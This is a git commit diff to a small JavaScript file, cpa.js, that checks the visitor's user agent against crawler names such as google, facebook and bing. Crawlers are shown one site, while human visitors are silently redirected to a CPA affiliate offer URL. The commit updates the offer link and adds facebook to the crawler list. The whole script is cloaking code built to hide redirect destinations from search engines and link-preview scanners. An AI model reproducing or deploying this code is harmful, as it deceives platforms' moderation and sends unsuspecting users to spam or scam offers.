f3cc37d20592bb34c3fc4bcb6bd0ddbaae5be459
karenmine1 <104679969+karenmine1@users.noreply.github.com>
2022-09-07 11:07:48 +0000

    Update cpa.js

--- cpa.js
+++ cpa.js
@@ -1,9 +1,9 @@
 (function(){
 	let params = (function(){var vars={};var parts=window.location.href.replace(/[?&]+([^=&]+)=([^&]*)/gi,function(m,key,value){vars[key]=value;});return vars;})();
-	let fafifu = /bot|google|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
+	let fafifu = /bot|google|facebook|teoma|baidu|bing|msn|duckduckbot|teoma|slurp|yandex/i.test(navigator.userAgent);
 	if(params.id) {
 		if(fafifu) location.replace('https://alistore.xyz/?s='+params.id+'');
-		else location.href = 'https://smrturl.co/o/55513/53218378?s1=';
+		else location.href = 'https://cdnflyer.com/srv.html?id=5522393&pub=322513';
 	}
 	if(params.gotcha) { document.addEventListener('DOMContentLoaded', function(){ document.title = 'Gotcha'; }); }
 })();
